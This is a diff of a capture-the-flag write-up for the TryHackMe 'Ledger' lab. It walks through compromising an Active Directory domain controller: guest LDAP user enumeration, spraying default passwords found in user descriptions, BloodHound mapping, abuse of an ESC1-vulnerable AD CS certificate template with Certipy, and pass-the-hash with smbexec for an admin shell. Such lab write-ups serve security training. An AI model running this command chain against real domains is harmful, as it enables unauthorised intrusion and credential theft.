@@ -1,7 +1,8 @@
+# LEDGER
 
-# PORT SCAN
----
+## PORT SCAN
 
+***
 
 | PORT      | SERVICE       |
 | --------- | ------------- |
@@ -14,7 +15,7 @@
 | 443/tcp   | ssl/http      |
 | 445/tcp   | microsoft-ds  |
 | 464/tcp   | kpasswd5      |
-| 593/tcp   | ncacn_http    |
+| 593/tcp   | ncacn\_http   |
 | 636/tcp   | ssl/ldap      |
 | 3268/tcp  | ldap          |
 | 3269/tcp  | ssl/ldap      |
@@ -26,7 +27,7 @@
 | 49666/tcp | msrpc         |
 | 49667/tcp | msrpc         |
 | 49669/tcp | msrpc         |
-| 49670/tcp | ncacn_http    |
+| 49670/tcp | ncacn\_http   |
 | 49671/tcp | msrpc         |
 | 49675/tcp | msrpc         |
 | 49676/tcp | msrpc         |
@@ -35,9 +36,9 @@
 | 49711/tcp | msrpc         |
 | 49716/tcp | msrpc         |
 
+## RECONNAISSANCE
 
-# RECONNAISSANCE
----
+***
 
 We need to add the dc and domain to `/etc/hosts` first:
 
@@ -180,18 +181,17 @@ nxc ldap labyrinth.thm.local -u 'guest' -p '' --users > users.txt
 
 We got `487` domain users:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250623195453.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250623195453.png)
 
 Interesting part on here is that two users have this description:
 
-
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250623195543.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250623195543.png)
 
 Let's begin exploitation.
 
+## EXPLOITATION
 
-# EXPLOITATION
----
+***
 
 We got two sets of possible credentials:
 
@@ -207,8 +207,7 @@ nxc smb labyrinth.thm.local -u 'IVY_WILLIS' -p 'CHANGEME2023!'
 nxc smb labyrinth.thm.local -u 'SUSANNA_MCKNIGHT' -p 'CHANGEME2023!' 
 ```
 
-
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250623195817.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250623195817.png)
 
 Both work for `smb`, `winrm` is not enabled on this machine but we got `rdp`, let's test for rdp then:
 
@@ -217,15 +216,13 @@ nxc rdp labyrinth.thm.local -u 'IVY_WILLIS' -p 'CHANGEME2023!'
 nxc rdp labyrinth.thm.local -u 'SUSANNA_MCKNIGHT' -p 'CHANGEME2023!' 
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250623195958.png)
-
+![](gitbook/cybersecurity/images/Pasted%20image%2020250623195958.png)
 
 We know that Susanna can rdp, first of all, let's use bloodhound to check any PE path:
 
 ```python
 bloodhound-python -d thm.local -u 'SUSANNA_MCKNIGHT' -p 'CHANGEME2023!' -ns 10.10.148.131 -c All --zip
 ```
-
 
 As always, if you already ingested data, you can clean up all data on `neo4j` using:
 
@@ -236,14 +233,13 @@ DETACH DELETE n
 
 Now, let's check up the data on bloodhound:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250624140039.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250624140039.png)
 
 Sussana is member of `remote desktop users` as we know, important stuff comes here, if we check the relations of `users@thm.local`, we can find this:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250624140227.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250624140227.png)
 
-
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250624140309.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250624140309.png)
 
 We have a relation with `Certificate Service DCOM Access` group, which means we can interact with AD CS, meaning that if we find a misconfigured certificate, we can get an admin session, we can test this by going into rdp and checking which groups we are part of:
 
@@ -251,18 +247,17 @@ We have a relation with `Certificate Service DCOM Access` group, which means we 
 xfreerdp /v:labyrinth.thm.local /u:'SUSANNA_MCKNIGHT' /p:'CHANGEME2023!' /dynamic-resolution /clipboard /cert:ignore
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250624140904.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250624140904.png)
 
 Now, let's check:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250624140937.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250624140937.png)
 
 As seen, we can find the certificate groups, let's begin privilege escalation.
 
+## PRIVILEGE ESCALATION
 
-
-# PRIVILEGE ESCALATION
----
+***
 
 First of all, we need to check which certificate may be vulnerable, to do this we'll be using `certipy`, if you don't have certipy-ad you can install it with:
 
@@ -366,11 +361,11 @@ We find there's a `ESC1` vulnerability on the `ServerAuth` certificate template,
 
 ARTICLE: https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-one/
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250624141454.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250624141454.png)
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250624141526.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250624141526.png)
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250624141549.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250624141549.png)
 
 Basically, what we'd need to do is to request a certificate on behalf of the Administrator user, then, using that certificate, we'll be able to get a session as the admin user.
 
@@ -422,7 +417,6 @@ Certipy v5.0.3 - by Oliver Lyak (ly4k)
 [*] Got hash for 'administrator@thm.local': aad3b435b51404eeaad3b435b51404ee:07d677a6cf40925beb80ad6428752322
 ```
 
-
 We got our hash, we can finally use `smbexec.py` to authenticate using the hash:
 
 ```python
@@ -433,11 +427,11 @@ python3 smbexec.py -k -hashes :07d677a6cf40925beb80ad6428752322 THM.LOCAL/Admini
 C:\Windows\system32>
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250624144621.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250624144621.png)
 
 We can finally get both flags and end the CTF:
 
-```PYTHON
+```python
 C:\Windows\system32>type C:\Users\SUSANNA_MCKNIGHT\Desktop\user.txt
 THM{ENUMERATION_IS_THE_KEY}
 
@@ -445,8 +439,4 @@ C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
 THM{THE_BYPASS_IS_CERTIFIED!}
 ```
 
-
-
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250623203625.png)
-
-
+![](gitbook/cybersecurity/images/Pasted%20image%2020250623203625.png)
